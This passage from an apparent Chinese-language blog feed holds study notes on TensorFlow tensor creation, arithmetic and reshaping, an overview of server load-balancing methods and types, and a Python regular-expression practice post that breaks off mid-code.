<code>dtype=tf.float32</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151715477552.jpg"alt="16151715477552" /><figcaption aria-hidden="true">16151715477552</figcaption></figure><p>改变张量中元素的数据类型：<code>tf.cast(tensor_x, dtype)</code>注意：要从低精度向高精度转换，否则可能会发生数据溢出，结果可能会错 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151718793156.jpg"alt="16151718793156" /></p><p>参数为 bool 类型时，非零对应 True： <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151721909289.jpg"alt="16151721909289" /></p><p>参数为 string 类型时，存储为字节字符串： <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151725243931.jpg"alt="16151725243931" /></p><h3 id="tf.convert_to_tensor-函数">tf.convert_to_tensor() 函数</h3><p>tf.convert_to_tensor(数组/列表/数字/布尔型/字符串)</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151727638426.jpg"alt="16151727638426" /><figcaption aria-hidden="true">16151727638426</figcaption></figure><h2 id="特殊张量">特殊张量</h2><p>全 0 张量: <code>tf.zeros(shape, dtype=tf.float32)</code> 全 1 张量:<code>tf.ones(shape, dtype=tf.float32)</code>元素值相同的张量：<code>tf.fill(dims, value)</code>、<code>tf.constant(value,shape)</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151837551875.jpg"alt="16151837551875" /><figcaption aria-hidden="true">16151837551875</figcaption></figure><h2 id="判断张量">判断张量</h2><ol type="1"><li><p>直接打印 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151745611027.jpg"alt="16151745611027" /></p></li><li><p>tf.is_tensor() 函数 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151742991631.jpg"alt="16151742991631" /></p></li><li><p>isinstance() <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151745016108.jpg"alt="16151745016108" /></p></li></ol><h2 id="随机数张量">随机数张量</h2><ol type="1"><li><p>正态分布<code>tf.random.normal(shape, mean=0, stddev=1, dtype)</code>四个参数：维度，均值，标准差，数据类型</p></li><li><p>截断正态分布<code>tf.random.truncated_normal(shape, mean, stddev, dtype)</code></p><ul><li>返回一个截断的正态分布</li><li>截断的标准是 2 倍的标准差 例如，当均值为 0，标准差为 1 时，使用tf.truncated_normal，不可能出现区间[-2，2]以外的点使用f.random_normal（），可能出现[-2，2]以外的点</li></ul></li><li><p>设置随机种子 <code>tf.randome.set_seed()</code> 函数 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151861270926.jpg"alt="16151861270926" /></p></li><li><p>均匀分布张量<code>tf.random.uniform(shape,minval,maxval,dtype)</code>,区间：[minval,maxval) <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151863499015.jpg"alt="16151863499015" /></p></li><li><p>随机打乱<code>tf.random.shuffle([tensor/list/ndarray])</code></p></li><li><p>创建序列<code>tf.range(start, limit, delta=1, dtype)</code></p></li></ol><h2 id="小结创建张量">小结：创建张量</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151876857241.jpg"alt="16151876857241" /><figcaption aria-hidden="true">16151876857241</figcaption></figure><h2 id="张量属性">张量属性</h2><p><code>ndim、shape、dtype</code> 或 Tensor 对象的<code>rank(), shape()、size()</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151882368946.jpg"alt="16151882368946" /><figcaption aria-hidden="true">16151882368946</figcaption></figure><h2 id="张量和-numpy-数组">张量和 numpy 数组</h2><ol type="1"><li>在 TensorFlow中，<strong>所有的运算都是在张量之间进行的</strong></li><li>NumPy 数组仅仅是作为输入和输出来使用</li><li>张量可以运行于 CPU，也可以运行于 GPU 和 TPU</li><li>而 NumPy 数组只能够在 CPU 中运行</li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tf 张量运算</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_tensor_op/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_tensor_op/</url>
      
        <content type="html"><![CDATA[<h2 id="四则运算">四则运算</h2><table><thead><tr class="header"><th>算术操作</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>tf.add(x, y)</td><td>将 x 和 y 逐元素相加</td></tr><tr class="even"><td>tf.subtract(x,y)</td><td>将 x 和 y 逐元素相减</td></tr><tr class="odd"><td>tf.multiply(x, y)</td><td>将 x 和 y 逐元素相乘</td></tr><tr class="even"><td>tf.dvide(x,y)</td><td>将 x 和 y 逐元素相除</td></tr><tr class="odd"><td>tf.math.mod(x, y)</td><td>对 x 逐元素取模</td></tr></tbody></table><p>加减乘除法运算，都是这两个张量逐元素的运算，并且要求各个张量中的元素数据类型必须一致。</p><h2 id="幂指数运算">幂指数运算</h2><table><thead><tr class="header"><th>算术操作</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>tf.pow(x, y)</td><td>对 x 求 y 的幂次方</td></tr><tr class="even"><td>tf.square(x)</td><td>对 x 逐元素求计算平方</td></tr><tr class="odd"><td>tf.sqrt(x)</td><td>对 x 逐元素开平方根</td></tr><tr class="even"><td>tf.exp(x)</td><td>计算 e 的 x 次方(x 为浮点数)</td></tr><tr class="odd"><td>tf.math.log(x)</td><td>计算自然对数底数为 e</td></tr></tbody></table><p>开平方根函数，要求参数是浮点数：tf.pow(x, y)(其中y&lt;1)、tf.sqrt、tf.exp(x)</p><h2 id="自然指数和自然对数运算">自然指数和自然对数运算</h2><p>tf.exp 和 tf.math.log 也要求张量是浮点数。 tensorflow只提供了自然对数，没有提供其他底数的对数。如需使用，可以采用换底公式来计算。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152544294725.jpg"alt="16152544294725" /><figcaption aria-hidden="true">16152544294725</figcaption></figure><p>指数运算和对数运算不在同一个模块中，以及没有提供以其他自然数为底的对数运算</p><h2 id="其他运算">其他运算</h2><table><thead><tr class="header"><th>函数</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>tf.sign(x)</td><td>返回 x 的符号</td></tr><tr class="even"><td>tf.abs(x)</td><td>对 x 逐元素求绝对值</td></tr><tr class="odd"><td>tf.negative(x)</td><td>对 x 逐元素求相反数,y=-x</td></tr><tr class="even"><td>tf.reciprocal(x)</td><td>取 x 的倒数</td></tr><tr class="odd"><td>tf.logical_not(x)</td><td>对 x 逐元素求的逻辑非</td></tr><tr class="even"><td>tf.ceil(x)</td><td>向上取整</td></tr><tr class="odd"><td>tf.floor(x)</td><td>向下取整</td></tr><tr class="even"><td>tf.rint(x)</td><td>取最接近的整数</td></tr><tr class="odd"><td>tf.round(x)</td><td>对 x 逐元素求舍入最接近的整数</td></tr><tr class="even"><td>tf.maximum(x, y)</td><td>返回两 tensor 中的最大值</td></tr><tr class="odd"><td>tf.minimum(x, y)</td><td>返回两 tensor 中的最小值</td></tr></tbody></table><table><colgroup><col style="width: 22%" /><col style="width: 19%" /><col style="width: 8%" /><col style="width: 26%" /><col style="width: 22%" /></colgroup><thead><tr class="header"><th>运算符</th><th>构造方法</th><th>运算符</th><th>构造方法</th><th></th></tr></thead><tbody><tr class="odd"><td>x+y</td><td>tf.add( )</td><td>x&amp;y</td><td>tf.logical_and()</td><td></td></tr><tr class="even"><td>x-y</td><td>t. subtract()</td><td>x</td><td>y</td><td>tf.logical_or()</td></tr><tr class="odd"><td>x*y</td><td>tf.multiply()</td><td>x^y</td><td>tf.logical_xor()</td><td></td></tr><tr class="even"><td>x/y(python2.0)</td><td>tf.divide()</td><td>~X</td><td>tf.logical_not()</td><td></td></tr><tr class="odd"><td>x/y(python3.0)</td><td>tf.truediv()</td><td>x&lt;y</td><td>tf.less()</td><td></td></tr><tr class="even"><td>x//y(python3.0)</td><td>floordiv()</td><td>X&lt;=y</td><td>tf.less_ equal()</td><td></td></tr><tr class="odd"><td>x%y</td><td>tf.math.mod()</td><td>x&gt;y</td><td>tf.greater()</td><td></td></tr><tr class="even"><td>x**y</td><td>tf.pow()</td><td>X&gt;=y</td><td>tf.greater_equal()</td><td></td></tr><tr class="odd"><td>-x</td><td>tf.neg()</td><td></td><td></td><td></td></tr><tr class="even"><td>abs(x)</td><td>tf.abs()</td><td></td><td></td><td></td></tr></tbody></table><p>广播机制：要求两个张量的最后一个维度相等。当张量和一个数字进行运算时，会将这个数字值广播到张量的各个元素。</p><p>张量和 NumPy 数组之间的相互转换</p><ol type="1"><li>NumPy 数组转化为张量：tf.constant（）；tf.convert_to_tensor</li><li>张量转换为 NumPy 数组：Tensor.numpy（）</li></ol><p>当张量和 NumPy 数组共同参与运算时：</p><ol type="1"><li>执行 TensorFlow 操作，那么 TensorFlow 将自动的把 NumPy数组转换为张量</li><li>执行 NumPy 操作，那么 NumPy 将自动的张量转换为 NumPy 数组</li><li>只要操作数中有一个 Tensor对象，就把所有的操作数都转化为张量，然后再进行运算。</li></ol><h2 id="张量乘法">张量乘法</h2><p>元素乘法：tf.multiply(value_a,value_a), * 运算符向量乘法：tf.matmul(value_a,)value_a, @ 运算符多维向量乘法采用广播机制，最后两维相乘，前面维度维度不变。当相乘张量的维度都大于 2 时，最后两维相乘，前面维度维度不变。</p><p>注意：tf.range() 和 np.arange() 默认的 dtype 不一样，numpy.arange默认 int64, tf.range 默认 32. <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152575706255.jpg"alt="16152575706255" /></p><h2id="数据统计求张量在某个维度上或者全局的统计值">数据统计：求张量在某个维度上、或者全局的统计值</h2><table><thead><tr class="header"><th>函数</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>tf.reduce_sum(input_tensor, axis)</td><td>求和</td></tr><tr class="even"><td>tf.reduce_mean(input_tensor, axis)</td><td>求平均值</td></tr><tr class="odd"><td>tf.reduce_max(input_tensor, axis)</td><td>求最大值</td></tr><tr class="even"><td>tf.reduce_min(input_tensor, axis)</td><td>求最小值</td></tr></tbody></table><p>如果张量元素为 int， 那么均值也会舍为int，如果希望精确地得到浮点数均值，有两种方式：</p><ol type="1"><li>定义张量的 <code>dtype=tf.float32</code> 等浮点类型</li><li>如果定义时，使用了整数，可以在调用 <code>tf.reduce_mean()</code>时， 采用 <code>tf.cast(values, tf.flaot32)</code>来将张量值转换为浮点数</li></ol><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152605253799.jpg"alt="16152605253799" /><figcaption aria-hidden="true">16152605253799</figcaption></figure><h2 id="求最值的索引">求最值的索引</h2><p><code>tf.argmax(), tf.argmin()</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152610087523.jpg"alt="16152610087523" /><figcaption aria-hidden="true">16152610087523</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tensorflow tensor 维度变换</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_tensor_shape/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_tensor_shape/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li>张量是 TensorFlow 中多维数组的载体，用 Tensor 对象实现</li><li>在 CPU 环境下，张量和 NumPy 数组是共享同一段内存的，只是 tensorflow和 numpy 各自采用不同的方式读取它。</li><li>多维张量在内存中是以一维数组的方式连续存储的</li></ol><p>改变张量的形状： <code>tf.reshape(tensor, shape)</code> <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151892314749.jpg"alt="16151892314749" /></p><p>创建时，修改维度： <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151893597593.jpg"alt="16151893597593" /></p><h2 id="轴与维度">轴与维度</h2><p>轴可以是负数，维数较多，需要操作后几维时，用负数方便。 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151894651299.jpg"alt="16151894651299" /></p><p>增加和删除维度 增加的这个维度上，长度为1：<code>tf.expand_dims(input, axis)</code> 删除维度，只能删除长度为 1的维度(不指定轴，删除所有维度为 1的轴)：<code>tf.squeeze(input, axis)</code>增加和删除维度，只是改变了张量的视图，不会改变张量的存储。 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151901304723.jpg"alt="16151901304723" /></p><h2 id="交换维度">交换维度</h2><p>tf.transpose(a, perm)，perm 为张量中各个轴的顺序对于二维张量，就是矩阵的转置。 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151931641917.jpg"alt="16151931641917" /></p><p>交换维度，不仅改变了张量的视图，同时也改变了张量的存储顺序</p><h2 id="拼接与分割">拼接与分割</h2><p>图像的分割与拼接，改变了张量的视图，张量的存储顺序并没有改变。</p><ol type="1"><li><p>拼接张量，拼接不会产生新的维度：<code>tf.concat(tesnsors,axis)</code>,<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151947573478.jpg"alt="16151947573478" /></p></li><li><p>分割张量，将一个张量拆分成多个张量，分割后维度不变。<code>tf.split(value, num_or_size_splits, axis=0)</code> value：张量num_or_size_splits:分割方案，单个数表示等长切割份数，序列时，就是每份 2:分割成 2 个张量 [1:2:1]: 就表示分割成三个张量,长度分别是 1,21 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151953184159.jpg"alt="16151953184159" /></p></li></ol><h2 id="堆叠和分解">堆叠和分解</h2><p>堆叠张量：<code>tf.stack(values,axis)</code>合并张量时，创建一个新的维度。</p><p>values: 堆叠的多个张量 axis: 指定插入新的维度的位置</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151956288185.jpg"alt="16151956288185" /><figcaption aria-hidden="true">16151956288185</figcaption></figure><p>分解张量：<code>tf.unstack(values,axis)</code>将张量分解为多个张量；分解后得到的每个张量，和原来的张量相比，维数都少了一维。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16152057498729.jpg"alt="16152057498729" /><figcaption aria-hidden="true">16152057498729</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>负载均衡技术</title>
      <link href="/blog/2021/06/18/websec/devices/load_balancing/"/>
      <url>/blog/2021/06/18/websec/devices/load_balancing/</url>
      
        <content type="html"><![CDATA[<h1 id="负载均衡技术">负载均衡技术</h1><h2 id="前言">前言</h2><p>负载均衡的用处：</p><ol type="1"><li>企业无法承担得起 Web服务器过载的后果。缓慢、故障的网络会影响关键业务服务，并导致差的终端用户体验，最终导致用户量流失，盈利能力下降。</li><li>内部员工忍受长时延、等待大量的 FTP 传输到达时，工作效率下降。</li></ol><p>服务器和应用程序负载平衡是系统管理员保持服务器正常运行的常用方法。在下面的部分中，我将详细讨论一个常见问题:“什么是负载均衡?”，同时深入研究现代负载平衡方法、当前应用负载均衡器的类型以及其他动态负载均衡信息。</p><h2 id="负载均衡">负载均衡</h2><p>负载均衡（或者服务器负载均衡）是将网络流量分布到多个后端服务器（也称服务器群）上的过程。通俗的讲就是统一分配请求的，负载均衡会统一接收全部请求，然后按照设定好的算法将这些请求分配给这个负载均衡组中的所有成员，以此来实现请求（负载）的均衡分配。这确保了单个服务器不会承载过重的负载，并能够保持高速、高质量向用户显示网络内容，从而优化应用程序和网络的可用性和响应性。通过均匀地分配工作，负载平衡提高了应用程序的响应能力。它还为用户增加了应用程序和网站的可用性。没有负载平衡器，现代应用程序就无法运行。随着时间的推移，软件负载平衡器增加了包括应用程序安全性在内的额外功能。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16233939859507.jpg"alt="16233939859507" /><figcaption aria-hidden="true">16233939859507</figcaption></figure><p>此外，由于云计算的普及，现在可以利用应用程序负载均衡器来帮助防止拒绝服务(DDoS)攻击。应用程序负载均衡器可以将来自公司服务器的网络和应用程序流量“卸载”到公共云服务器或提供商，从而保护流量免受危险的网络攻击者的干扰。</p><p>F5是负载均衡产品的一个品牌，其地位类似于诺基亚在手机品牌中的位置。除了 F5以外，Radware、Array、A10、Cisco、深信服和华夏创新都是负载均衡的牌子，因为F5 在这类产品中影响最大，所以经常说 F5 负载均衡。</p><h2 id="应用程序负载均衡器配置方法">应用程序负载均衡器配置方法</h2><p>了解负载均衡器是如何工作的很重要，包括 Web服务器负载均衡器是如何工作的。对于初学者来说，存在几种负载平衡方法，也称为负载平衡技术。这些方法依赖于确定服务器群中的哪个服务器应该接收每个客户端请求的算法。以下是五种最常见的负载平衡方法:</p><ol type="1"><li><p>Round Robin（轮询法）轮询法依赖于一个轮换系统来对网络和应用程序流量进行排序。将请求按顺序轮流地分配到后端服务器上，它均衡地对待后端的每一台服务器，而不关心服务器实际的连接数和当前的系统负载。这种方法适用于服务器处理能力相同，且每笔业务处理量差异不大时。</p></li><li><p>IP Hash（源地址哈希） 客户端的 IP地址决定了哪个服务器接收它的请求。源地址哈希的思想是根据获取客户端的 IP地址，通过哈希函数计算得到的一个数值，用该数值对服务器列表的大小进行取模运算，得到的结果便是客服端要访问服务器的序号。采用源地址哈希法进行负载均衡，同一IP地址的客户端，当后端服务器列表不变时，它每次都会映射到同一台后端服务器进行访问。</p></li><li><p>最小连接（Least Connections）正如其名称所示，最小连接方法将流量导向活动连接数量最少的服务器。这在流量大的时期很有用，因为它有助于在所有可用服务器之间保持均匀分布。</p></li><li><p>最小响应时间（Least Response Time）最小响应时间方法将流量导向到具有最少活动连接量和最低平均响应时间的服务器。</p></li><li><p>最小带宽（Least Bandwidth） 这种应用负载均衡方法以每秒 Mbps为单位计算流量，将客户端请求发送给服务器的流量最小 Mbps。</p></li></ol><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16233939225336.jpg"alt="16233939225336" /><figcaption aria-hidden="true">16233939225336</figcaption></figure><h2 id="负载均衡类型">负载均衡类型</h2><p>对于一个网络，可能需要考虑许多特定类型的负载平衡，包括关系数据库的SQL Server负载平衡、跨多个地理位置进行故障排除的全局服务器负载平衡，以及确保域名功能的DNS服务器负载平衡。此外，还可以根据各种可用的基于云的负载均衡器(包括著名的AWS 弹性负载均衡器)来考虑负载均衡器的类型:</p><ol type="1"><li><p>网络负载均衡（Network Load Balancing）网络负载均衡利用网络层信息来决定将网络流量发送到哪里。这是通过第 4层负载均衡实现的，该负载均衡被设计用来处理所有形式的 TCP/UDP流量。网络负载平衡被认为是所有负载平衡解决方案中速度最快的，但是当涉及到服务器间流量的平衡分配时，它往往达不到要求。</p></li><li><p>HTTP(S)负载均衡（HTTP(S) Load Balancing）HTTP(S)负载均衡是最古老的负载均衡形式之一。这种负载平衡形式依赖于第 7层，这意味着它在应用层中运行。HTTP负载平衡通常被称为最灵活的负载平衡类型，因为它允许您根据 HTTP地址附带的任何信息形成分布决策。</p></li><li><p>内部负载均衡（Internal Load Balancing）内部负载均衡与网络负载均衡几乎相同，但是可以用来平衡内部基础设施。</p></li></ol><p>在讨论负载均衡器类型时，还需要注意硬件负载均衡器、软件负载均衡器和虚拟负载均衡器。</p><ol type="1"><li><p>硬件负载均衡器（Hardware Load Balancer）顾名思义，硬件负载均衡器依赖于物理的本地硬件来分发应用程序和网络流量。这些设备可以处理大量的流量，但往往价格高昂，在灵活性方面相当有限。</p></li><li><p>软件负载均衡器（Software Load Balancer）软件负载均衡器有两种形式：商业的或开源的。在使用之前必须安装。与基于云的平衡器一样，这些解决方案往往比硬件解决方案更实惠。</p></li><li><p>虚拟负载均衡器（Virtual Load Balancer）与软件负载均衡器不同的是，虚拟负载均衡器是将硬件负载均衡设备的软件部署在虚拟机上。</p></li></ol><h2 id="总结">总结</h2><p>应用服务器负载平衡是将入站网络和应用程序流量分布到多个服务器上。每天的每分钟，都有数百个用户或客户机请求，使得任何一个负载均衡器服务器都很难跟上数据的需求。在服务器之间分发这些请求有助于确保正常运行时间，并将慢速保持在最低限度，以确保用户和员工满意。</p><h2 id="推荐阅读">推荐阅读</h2><p><ahref="https://www.cnblogs.com/kingreatwill/p/7991151.html#/cnblog/works/article/7991151">负载均衡在分布式架构中是怎么玩起来的？- kingreatwill - 博客园</a></p><h2 id="参考资料">参考资料</h2><ol type="1"><li><ahref="https://www.idongde.com/q/664b235129f2c12b/a1867860.shtml">负载均衡和F5 是什么意思？ - 150****3899 的回答 - 懂得</a></li><li><ahref="https://www.dnsstuff.com/what-is-server-load-balancing">What IsLoad Balancing? Types, Configurations, and Best Tools -DNSstuff</a></li><li><a href="https://zhuanlan.zhihu.com/p/68733507">负载均衡的 6种算法，Ngnix 的 5 种算法！ - 知乎</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python re 函数操作练习</title>
      <link href="/blog/2021/06/16/programming/python/re_practice/"/>
      <url>/blog/2021/06/16/programming/python/re_practice/</url>
      
        <content type="html"><![CDATA[<h1 id="python-regexp-函数方法">Python Regexp 函数方法</h1><h1 id="re-模块操作">3. re 模块操作</h1><ol type="1"><li>re 模块的使用过程</li></ol><h1 id="匹配单个字符">4. 匹配单个字符</h1><p>正则表达式的单字符匹配</p><table><thead><tr class="header"><th style="text-align: center;">字符</th><th style="text-align: left;">功能</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">.</td><td style="text-align: left;">匹配任意 1 个字符（除了）</td></tr><tr class="even"><td style="text-align: center;">[ ]</td><td style="text-align: left;">匹配[ ]中列举的字符</td></tr><tr class="odd"><td style="text-align: center;"> 匹配数字，即 0-9</td><td style="text-align: left;"></td></tr><tr class="even"><td style="text-align: center;"></td><td style="text-align: left;">匹配非数字，即不是数字</td></tr><tr class="odd"><td style="text-align: center;"></td><td style="text-align: left;">匹配空白，即空格，tab 键</td></tr><tr class="even"><td style="text-align: center;"></td><td style="text-align: left;">匹配非空白</td></tr><tr class="odd"><td style="text-align: center;"></td><td style="text-align: left;">匹配单词字符，即 az、AZ、0-9、_</td></tr><tr class="even"><td style="text-align: center;"></td><td style="text-align: left;">匹配非单词字符</td></tr></tbody></table><ul><li>点 <code>.</code> 匹配任意一个字符</li></ul><p>配单个数字</p><p>[12345678] 匹配 1-8 中任意一个数字</p><p>[138] 匹配 1、3、8 中任意一个数字</p><p>[1-8] 同上</p><p>[1-36-8] s 匹配 1-3 或 6-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情[12345678]&#x27;</span>,<span class="string">&#x27;速度与激情4&#x27;</span>)</span><br><span class="line">Out[<span class="number">17</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情4&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情[1-8]&#x27;</span>,<span class="string">&#x27;速度与激情35&#x27;</span>)</span><br><span class="line">Out[<span class="number">25</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情3&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">31</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情[1-36-8]&#x27;</span>,<span class="string">&#x27;速度与激情7&#x27;</span>)</span><br><span class="line">Out[<span class="number">31</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情7&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>[1-8abcd] 匹配数字 1-8 以及 a、b、c、d 四个字符</p><p>[1-8a-d] 匹配数字 1-8 以及 a-d</p><p>[1-8a-zA-Z] 匹配数字 1-8 以及 a-z 以及 A-Z</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">33</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情[1-8abcd]&#x27;</span>,<span class="string">&#x27;速度与激情7&#x27;</span>)</span><br><span class="line">Out[<span class="number">33</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情7&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情[1-8a-d]&#x27;</span>,<span class="string">&#x27;速度与激情a&#x27;</span>)</span><br><span class="line">Out[<span class="number">38</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情a&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情[1-8a-zA-Z]&#x27;</span>,<span class="string">&#x27;速度与激情f&#x27;</span>)</span><br><span class="line">Out[<span class="number">39</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情f&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情[1-8a-zA-Z]&#x27;</span>,<span class="string">&#x27;速度与激情K&#x27;</span>)</span><br><span class="line">Out[<span class="number">40</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情K&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>配一个数字</p><p>匹配一个 word，其中包括：a-z， A-Z，0-9 还有下划线（_）,此外，它还能匹配中文。所以一般不使用它，使用[a-zA-Z0-9_] 来代替它</p><p>匹配一个空白字符，如：空格、 等</p><p>所有的大写字母都是匹配与小写相反的字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\w&#x27;</span>,<span class="string">&#x27;速度与激情5&#x27;</span>)</span><br><span class="line">Out[<span class="number">43</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情5&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">44</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\w&#x27;</span>,<span class="string">&#x27;速度与激情_&#x27;</span>)</span><br><span class="line">Out[<span class="number">44</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情_&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\w&#x27;</span>,<span class="string">&#x27;速度与激情K&#x27;</span>)</span><br><span class="line">Out[<span class="number">41</span>]: &lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">6</span>), <span class="keyword">match</span>=<span class="string">&#x27;速度与激情K&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="匹配多个字符">5. 匹配多个字符</h1><table><thead><tr class="header"><th style="text-align: center;">字符</th><th style="text-align: left;">功能</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">*</td><td style="text-align: left;">匹配前一个字符出现 0次或者无限次，即可有可无</td></tr><tr class="even"><td style="text-align: center;">+</td><td style="text-align: left;">匹配前一个字符出现 1次或者无限次，即至少有 1 次</td></tr><tr class="odd"><td style="text-align: center;">?</td><td style="text-align: left;">匹配前一个字符出现 1 次或者 0 次，即要么有1 次，要么没有</td></tr><tr class="even"><td style="text-align: center;">{m}</td><td style="text-align: left;">匹配前一个字符出现 m 次</td></tr><tr class="odd"><td style="text-align: center;">{m,n}</td><td style="text-align: left;">匹配前一个字符出现从 m 到 n 次</td></tr></tbody></table><p>最简单的思路：多写几个单个字符匹配就成了多个字符匹配。</p><p>缺点：只能匹配指定个数的字符，多了少了都会报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">12</span>]: re.<span class="keyword">match</span>(<span class="string">r&#x27;速度与激情\d\d&#x27;</span>, <span class="string">&#x27;速度与激情45&#x27;</span>).group()</span><br><span class="line">Out[<span class="number">12</span>]: <span class="string">&#x27;速度与激情45&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span 